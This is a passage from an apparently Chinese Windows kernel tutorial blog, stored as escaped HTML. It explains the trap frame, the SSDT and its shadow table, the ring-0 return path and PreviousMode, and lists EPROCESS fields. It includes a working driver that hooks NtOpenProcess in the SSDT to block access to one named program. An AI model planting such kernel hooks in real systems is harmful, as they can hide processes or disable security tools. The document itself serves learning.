                               <span class=\"comment\">//0x13</span></span><br><span class=\"line\">    ULONG TempEsp;                                                          <span class=\"comment\">//0x14</span></span><br><span class=\"line\">    ULONG Dr0;                                                              <span class=\"comment\">//0x18</span></span><br><span class=\"line\">    ULONG Dr1;                                                              <span class=\"comment\">//0x1c</span></span><br><span class=\"line\">    ULONG Dr2;                                                              <span class=\"comment\">//0x20</span></span><br><span class=\"line\">    ULONG Dr3;                                                              <span class=\"comment\">//0x24</span></span><br><span class=\"line\">    ULONG Dr6;                                                              <span class=\"comment\">//0x28</span></span><br><span class=\"line\">    ULONG Dr7;                                                              <span class=\"comment\">//0x2c</span></span><br><span class=\"line\">    ULONG SegGs;                                                            <span class=\"comment\">//0x30</span></span><br><span class=\"line\">    ULONG SegEs;                                                            <span class=\"comment\">//0x34</span></span><br><span class=\"line\">    ULONG SegDs;                                                            <span class=\"comment\">//0x38</span></span><br><span class=\"line\">    ULONG Edx;                                                              <span class=\"comment\">//0x3c</span></span><br><span class=\"line\">    ULONG Ecx;                                                              <span class=\"comment\">//0x40</span></span><br><span class=\"line\">    ULONG Eax;                                                              <span class=\"comment\">//0x44</span></span><br><span class=\"line\">    ULONG PreviousPreviousMode;                                             <span class=\"comment\">//0x48-----R0用</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_EXCEPTION_REGISTRATION_RECORD</span>* ExceptionList;                   <span class=\"comment\">//0x4c</span></span><br><span class=\"line\">    ULONG SegFs;                                                            <span class=\"comment\">//0x50</span></span><br><span class=\"line\">    ULONG Edi;                                                              <span class=\"comment\">//0x54</span></span><br><span class=\"line\">    ULONG Esi;                                                              <span class=\"comment\">//0x58</span></span><br><span class=\"line\">    ULONG Ebx;                                                              <span class=\"comment\">//0x5c</span></span><br><span class=\"line\">    ULONG Ebp;                                                              <span class=\"comment\">//0x60</span></span><br><span class=\"line\">    ULONG ErrCode;                                                          <span class=\"comment\">//0x64</span></span><br><span class=\"line\">    ULONG Eip;                                                              <span class=\"comment\">//0x68</span></span><br><span class=\"line\">    ULONG SegCs;                                                            <span class=\"comment\">//0x6c </span></span><br><span class=\"line\">    ULONG EFlags;                                                           <span class=\"comment\">//0x70-----R3用</span></span><br><span class=\"line\">    ULONG HardwareEsp;                                                      <span class=\"comment\">//0x74 </span></span><br><span class=\"line\">    ULONG HardwareSegSs;                                                    <span class=\"comment\">//0x78</span></span><br><span class=\"line\">    ULONG V86Es;                                                            <span class=\"comment\">//0x7c\t虚拟8086模式下，保护模式下不用</span></span><br><span class=\"line\">    ULONG V86Ds;                                                            <span class=\"comment\">//0x80</span></span><br><span class=\"line\">    ULONG V86Fs;                                                            <span class=\"comment\">//0x84</span></span><br><span class=\"line\">    ULONG V86Gs;                                                            <span class=\"comment\">//0x88</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606213328593.png\" alt=\"image-20230606213328593\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606213340869.png\" alt=\"image-20230606213340869\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606214811005.png\" alt=\"image-20230606214811005\"></p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606214823709.png\" alt=\"image-20230606214823709\"></p>\n<h1 id=\"2、系统服务描述表\"><a href=\"#2、系统服务描述表\" class=\"headerlink\" title=\"2、系统服务描述表\"></a>2、系统服务描述表</h1><p>由上边分析可知，最后调用的函数来自于一个ServiceTable，这个叫做服务表，一共有两张，一张叫做<code>SystemServiceDecriptionTable</code>，另一张叫做<code>SystemServiceDecriptionTableShadow</code>其中后边这张只有带有UI的程序才会存在。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">_KSERVICE_TABLKSERVICE_TABLE_DESCRIPTORE_DESCRIPTOR</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    PULONG_PTR FuncPoint;\t<span class=\"comment\">//指向函数表</span></span><br><span class=\"line\">    PULONG Count;\t\t\t<span class=\"comment\">//调用的次数</span></span><br><span class=\"line\">    PULONG Limit;\t\t\t<span class=\"comment\">//函数个数</span></span><br><span class=\"line\">    PUCHAR ArgsPoint;\t\t<span class=\"comment\">//参数列表</span></span><br><span class=\"line\">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> NUMBER_SERVICE_TABLES 2</span></span><br><span class=\"line\"> </span><br><span class=\"line\">KSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable[NUMBER_SERVICE_TABLES]</span><br><span class=\"line\">KSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTableShadow[NUMBER_SERVICE_TABLES]</span><br></pre></td></tr></table></figure>\n\n<p>Windows中提供了一个导出的全局变量<code>SystemServicesDescriptorTable</code>，也叫SSDT。这个全局变量存储了系统服务表的地址，但仅存储了第一张表的地址。</p>\n<p>在windbg中输入命令 <code>dd KeServiceDescriptorTable</code>查看该全局变量。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606215841958.png\" alt=\"image-20230606215841958\"></p>\n<p>一张表共0x10个字节，也解释微软在上边通过服务号计算表的算法为什么利用0x10算。内核中还有一个全局变量称为SSDT Shadow，该变量未导出，但可以查看所有的系统服务表。在windbg中输入命令 <code>dd KeServiceDescriptorTableShadow</code>，也叫SSSDT。查看该全局变量。可以看到所有的系统服务表。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606220710700.png\" alt=\"image-20230606220710700\"></p>\n<h2 id=\"2-1-分析SSSDT初始化\"><a href=\"#2-1-分析SSSDT初始化\" class=\"headerlink\" title=\"2.1 分析SSSDT初始化\"></a>2.1 分析SSSDT初始化</h2><p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606221830957.png\" alt=\"image-20230606221830957\"></p>\n<h2 id=\"2-2-服务号\"><a href=\"#2-2-服务号\" class=\"headerlink\" title=\"2.2 服务号\"></a>2.2 服务号</h2><p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606222957415.png\" alt=\"image-20230606222957415\"></p>\n<p>小技巧：服务号&gt;0x1000是SSSDT，小于0x1000是SSDT。</p>\n<h1 id=\"3、R0回R3\"><a href=\"#3、R0回R3\" class=\"headerlink\" title=\"3、R0回R3\"></a>3、R0回R3</h1><p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606223405698.png\" alt=\"image-20230606223405698\"></p>\n<p>检查ETW日志是否需要记录。并为Kthread-&gt;TrapFrame成员赋值。可用于恢复旧TrapFrame或蓝屏时进行堆栈回溯。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606223421453.png\" alt=\"image-20230606223421453\"></p>\n<p>随后判断是否虚拟8086模式和之前的特权级。并相应的执行性能统计</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606223444266.png\" alt=\"image-20230606223444266\"></p>\n<p>如果有APC需要处理则处理APC。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606223500077.png\" alt=\"image-20230606223500077\"></p>\n<p>恢复异常链表及调试寄存器（如果为调试模式的话）。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606223512539.png\" alt=\"image-20230606223512539\"></p>\n<p>进行一万个感觉没卵用的判断</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606223529963.png\" alt=\"image-20230606223529963\"></p>\n<p>最后恢复各种寄存器，并以iret方式返回3环。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230606223541132.png\" alt=\"image-20230606223541132\"></p>\n<h1 id=\"4、HOOK-SSDT\"><a href=\"#4、HOOK-SSDT\" class=\"headerlink\" title=\"4、HOOK SSDT\"></a>4、HOOK SSDT</h1><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;ntifs.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">_KSERVICE_TABLKSERVICE_TABLE_DESCRIPTORE_DESCRIPTOR</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPULONG_PTR FuncPoint;\t<span class=\"comment\">//指向函数表</span></span><br><span class=\"line\">\tPULONG Count;\t\t\t<span class=\"comment\">//调用的次数</span></span><br><span class=\"line\">\tPULONG Limit;\t\t\t<span class=\"comment\">//函数个数</span></span><br><span class=\"line\">\tPUCHAR ArgsPoint;\t\t<span class=\"comment\">//参数列表</span></span><br><span class=\"line\">&#125;KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">EXTERN_C PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">NTSTATUS</span><span class=\"params\">(NTAPI *fnNtOpenProcess)</span><span class=\"params\">(_Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_ POBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ PCLIENT_ID ClientId)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">fnNtOpenProcess lpOpenProcess = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">PVOID <span class=\"title\">HookSSDT</span><span class=\"params\">(ULONG serviceIndex, PVOID hkFunc)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tULONG func_offset = serviceIndex &amp; <span class=\"number\">0xFFF</span>;</span><br><span class=\"line\">\tPULONG_PTR func_pointer = &amp;((KeServiceDescriptorTable-&gt;FuncPoint)[func_offset]);</span><br><span class=\"line\">\tPHYSICAL_ADDRESS tmp = <span class=\"built_in\">MmGetPhysicalAddress</span>(func_pointer);</span><br><span class=\"line\">\tPULONG_PTR mapAddr = <span class=\"built_in\">MmMapIoSpace</span>(tmp, PAGE_SIZE, MmCached);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (mapAddr &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tPVOID origin = (KeServiceDescriptorTable-&gt;FuncPoint)[func_offset]; <span class=\"comment\">//获取原始函数</span></span><br><span class=\"line\">\t\t*mapAddr = hkFunc;<span class=\"comment\">//hook函数</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> origin;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">VOID <span class=\"title\">unloadDrv</span><span class=\"params\">(PDRIVER_OBJECT pDrv)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">HookSSDT</span>(<span class=\"number\">0xBE</span>, lpOpenProcess);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">NTSTATUS NTAPI <span class=\"title\">MyNtOpenProcess</span><span class=\"params\">(_Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_ POBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ PCLIENT_ID ClientId)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tPEPROCESS eproc = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tNTSTATUS status = <span class=\"built_in\">PsLookupProcessByProcessId</span>(ClientId-&gt;UniqueProcess, &amp;eproc);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">NT_SUCCESS</span>(status))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tPUNICODE_STRING imageName = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\tstatus = <span class=\"built_in\">SeLocateProcessImageName</span>(eproc, &amp;imageName);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">NT_SUCCESS</span>(status))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tUNICODE_STRING target = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">RtlInitUnicodeString</span>(&amp;target, <span class=\"string\">L&quot;\\\\Device\\\\HarddiskVolume2\\\\内核工具包\\\\Loader\\\\InstDrv.exe&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!<span class=\"built_in\">RtlCompareUnicodeString</span>(imageName, &amp;target, TRUE))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">DbgPrintEx</span>(<span class=\"number\">77</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;hook \\r\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> STATUS_ACCESS_VIOLATION;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"built_in\">lpOpenProcess</span>(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">NTSTATUS <span class=\"title\">DriverEntry</span><span class=\"params\">(PDRIVER_OBJECT pDrv, PUNICODE_STRING pReg)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tpDrv-&gt;DriverUnload = unloadDrv;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlpOpenProcess = <span class=\"built_in\">HookSSDT</span>(<span class=\"number\">0xBE</span>, MyNtOpenProcess);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (lpOpenProcess&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"built_in\">DbgPrintEx</span>(<span class=\"number\">77</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;ok\\r\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t<span class=\"built_in\">DbgPrintEx</span>(<span class=\"number\">77</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;no\\r\\n&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过HOOK OpenProcess函数判断如果打开的进程为InstDrv则直接返回失败，效果：CE对进程InstDrv无图标。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230607113834088.png\" alt=\"image-20230607113834088\"></p>\n<p>打开进程失败。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230607113849972.png\" alt=\"image-20230607113849972\"></p>\n<p>驱动卸载后，一切正常。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230607113908536.png\" alt=\"image-20230607113908536\"></p>\n<h1 id=\"5、PreviousMode理解\"><a href=\"#5、PreviousMode理解\" class=\"headerlink\" title=\"5、PreviousMode理解\"></a>5、PreviousMode理解</h1><p>假如R3向驱动发送了一个信息号，让驱动执行函数<code>NtProtectVirtualMemory</code>,此时R0的PreviousMode为1，即为三环。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230607114434208.png\" alt=\"image-20230607114434208\"></p>\n<p>打开WRK查看函数<code>NtProtectVirtualMemory</code>流程</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230607114506759.png\" alt=\"image-20230607114506759\"></p>\n<p>可以看到如果PreviousMode不是KernelMode，则会判断当前传进来的参数是否可读，否则会跑出一个异常。<code>这里的坑就是,假设通过驱动修改某个进程地址的属性，那么此时BaseAddress属于R3的内存范围,因此这里的判断就会出错,进入异常。</code></p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230607114728846.png\" alt=\"image-20230607114728846\"></p>\n<p>因此需要在调用的时候修改PreviousMode。</p>\n<p><img src=\"/../images/Window-Kernel/x86%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/image-20230607114858636.png\" alt=\"image-20230607114858636\"></p>\n<p>调用完毕后再修改回来。</p>\n","categories":["Windows-Kernel"]},{"title":"x86进程线程","url":"/2023/06/13/x86%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/","content":"<h1 id=\"1、EPROCESS\"><a href=\"#1、EPROCESS\" class=\"headerlink\" title=\"1、EPROCESS\"></a>1、EPROCESS</h1><p>进程结构，每个进程都有这样一个结构。EPROCESS中还有一个KPROCESS，其中EPROCESS被称为<code>执行体</code>,主要是给R3进行访问；KPROCESS才是真正的对象结构。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//0x2c0 bytes (sizeof)</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">_EPROCESS</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_KPROCESS</span> Pcb;                                                   <span class=\"comment\">//0x0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_EX_PUSH_LOCK</span> ProcessLock;                                       <span class=\"comment\">//0x98</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> CreateTime;                                        <span class=\"comment\">//0xa0</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> ExitTime;                                          <span class=\"comment\">//0xa8</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_EX_RUNDOWN_REF</span> RundownProtect;                                  <span class=\"comment\">//0xb0</span></span><br><span class=\"line\">    VOID* UniqueProcessId;                                                  <span class=\"comment\">//0xb4</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> ActiveProcessLinks;                                  <span class=\"comment\">//0xb8</span></span><br><span class=\"line\">    ULONG ProcessQuotaUsage[<span class=\"number\">2</span>];                                             <span class=\"comment\">//0xc0</span></span><br><span class=\"line\">    ULONG ProcessQuotaPeak[<span class=\"number\">2</span>];                                              <span class=\"comment\">//0xc8</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG CommitCharge;                                            <span class=\"comment\">//0xd0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_EPROCESS_QUOTA_BLOCK</span>* QuotaBlock;                               <span class=\"comment\">//0xd4</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_PS_CPU_QUOTA_BLOCK</span>* CpuQuotaBlock;                              <span class=\"comment\">//0xd8</span></span><br><span class=\"line\">    ULONG PeakVirtualSize;                                                  <span class=\"comment\">//0xdc</span></span><br><span class=\"line\">    ULONG VirtualSize;                                                      <span class=\"comment\">//0xe0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> SessionProcessLinks;                                 <span class=\"comment\">//0xe4</span></span><br><span class=\"line\">    VOID* DebugPort;                                                        <span class=\"comment\">//0xec</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        VOID* ExceptionPortData;                                            <span class=\"comment\">//0xf0</span></span><br><span class=\"line\">        ULONG ExceptionPortValue;                                           <span class=\"comment\">//0xf0</span></span><br><span class=\"line\">        ULONG ExceptionPortState:<span class=\"number\">3</span>;                                         <span class=\"comment\">//0xf0</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_HANDLE_TABLE</span>* ObjectTable;                                      <span class=\"comment\">//0xf4</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_EX_FAST_REF</span> Token;                                              <span class=\"comment\">//0xf8</span></span><br><span class=\"line\">    ULONG WorkingSetPage;                                                   <span class=\"comment\">//0xfc</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_EX_PUSH_LOCK</span> AddressCreationLock;                               <span class=\"comment\">//0x100</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_ETHREAD</span>* RotateInProgress;                                      <span class=\"comment\">//0x104</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_ETHREAD</span>* ForkInProgress;                                        <span class=\"comment\">//0x108</span></span><br><span class=\"line\">    ULONG HardwareTrigger;                                                  <span class=\"comment\">//0x10c</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_MM_AVL_TABLE</span>* PhysicalVadRoot;                                  <span class=\"comment\">//0x110</span></span><br><span class=\"line\">    VOID* CloneRoot;                                                        <span class=\"comment\">//0x114</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG NumberOfPrivatePages;                                    <span class=\"comment\">//0x118</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG NumberOfLockedPages;                                     <span class=\"comment\">//0x11c</span></span><br><span class=\"line\">    VOID* Win32Process;                                                     <span class=\"comment\">//0x120</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_EJOB</span>* <span class=\"keyword\">volatile</span> Job;                                             <span class=\"comment\">//0x124</span></span><br><span class=\"line\">    VOID* SectionObject;                                                    <span class=\"comment\">//0x128</span></span><br><span class=\"line\">    VOID* SectionBaseAddress;                                               <span class=\"comment\">//0x12c</span></span><br><span class=\"line\">    ULONG Cookie;                                                           <span class=\"comment\">//0x130</span></span><br><span class=\"line\">    ULONG Spare8;                                                           <span class=\"comment\">//0x134</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_PAGEFAULT_HISTORY</span>* WorkingSetWatch;                             <span class=\"comment\">//0x138</span></span><br><span class=\"line\">    VOID* Win32WindowStation;                                               <span class=\"comment\">//0x13c</span></span><br><span class=\"line\">    VOID* InheritedFromUniqueProcessId;                                     <span class=\"comment\">//0x140</span></span><br><span class=\"line\">    VOID* LdtInformation;                                                   <span class=\"comment\">//0x144</span></span><br><span class=\"line\">    VOID* VdmObjects;                                                       <span class=\"comment\">//0x148</span></span><br><span class=\"line\">    ULONG ConsoleHostProcess;                                               <span class=\"comment\">//0x14c</span></span><br><span class=\"line\">    VOID* DeviceMap;                                                        <span class=\"comment\">//0x150</span></span><br><span class=\"line\">    VOID* EtwDataSource;                                                    <span class=\"comment\">//0x154</span></span><br><span class=\"line\">    VOID* FreeTebHint;                                                      <span class=\"comment\">//0x158</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">_HARDWARE_PTE</span> PageDirectoryPte;                              <span class=\"comment\">//0x160</span></span><br><span class=\"line\">        ULONGLONG Filler;                                                   <span class=\"comment\">//0x160</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    VOID* Session;                                                          <span class=\"comment\">//0x168</span></span><br><span class=\"line\">    UCHAR ImageFileName[<span class=\"number\">15</span>];                                                <span class=\"comment\">//0x16c</span></span><br><span class=\"line\">    UCHAR PriorityClass;                                                    <span class=\"comment\">//0x17b</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> JobLinks;                                            <span class=\"comment\">//0x17c</span></span><br><span class=\"line\">    VOID* LockedPagesList;                                                  <span class=\"comment\">//0x184</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> ThreadListHead;                                      <span class=\"comment\">//0x188</span></span><br><span class=\"line\">    VOID* SecurityPort;                                                     <span class=\"comment\">//0x190</span></span><br><span class=\"line\">    VOID* PaeTop;                                                           <span class=\"comment\">//0x194</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG ActiveThreads;                                           <span class=\"comment\">//0x198</span></span><br><span class=\"line\">    ULONG ImagePathHash;                                                    <span class=\"comment\">//0x19c</span></span><br><span class=\"line\">    ULONG DefaultHardErrorProcessing;                                       <span class=\"comment\">//0x1a0</span></span><br><span class=\"line\">    LONG LastThreadExitStatus;                                              <span class=\"comment\">//0x1a4</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_PEB</span>* Peb;                                                       <span class=\"comment\">//0x1a8</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_EX_FAST_REF</span> PrefetchTrace;                                      <span class=\"comment\">//0x1ac</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> ReadOperationCount;                                <span class=\"comment\">//0x1b0</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> WriteOperationCount;                               <span class=\"comment\">//0x1b8</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> OtherOperationCount;                               <span class=\"comment\">//0x1c0</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> ReadTransferCount;                                 <span class=\"comment\">//0x1c8</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> WriteTransferCount;                                <span class=\"comment\">//0x1d0</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span> <span class=\"title class_\">_LARGE_INTEGER</span> OtherTransferCount;                                <span class=\"comment\">//0x1d8</span></span><br><span class=\"line\">    ULONG CommitChargeLimit;                                                <span class=\"comment\">//0x1e0</span></span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> ULONG CommitChargePeak;                                        <span class=\"comment\">//0x1e4</span></span><br><span class=\"line\">    VOID* AweInfo;                                                          <span class=\"comment\">//0x1e8</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_SE_AUDIT_PROCESS_CREATION_INFO</span> SeAuditProcessCreationInfo;      <span class=\"comment\">//0x1ec</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_MMSUPPORT</span> Vm;                                                   <span class=\"comment\">//0x1f0</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">_LIST_ENTRY</span> MmProcessLinks;                                      <span class=\"comment\">//0x25c</span></span><br><span class=\"line\">    VOID* HighestUserAddress;                                               <span class=\"comment\">//0x264</span></span><br><span class=\"line\">    ULONG ModifiedPageCount;                                                <span class=\"comment\">//0x268</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ULONG Flags2;                                                       <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">        <span class=\"keyword\">struct</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            ULONG JobNotReallyActive:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG AccountingFolded:<span class=\"number\">1</span>;                                       <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG NewProcessReported:<span class=\"number\">1</span>;                                     <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG ExitProcessReported:<span class=\"number\">1</span>;                                    <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG ReportCommitChanges:<span class=\"number\">1</span>;                                    <span class=\"comment\">//0x26c</span></span><br><span class=\"line\">            ULONG LastReportMemory:<span class=\"number\">1</span>;                                       <span 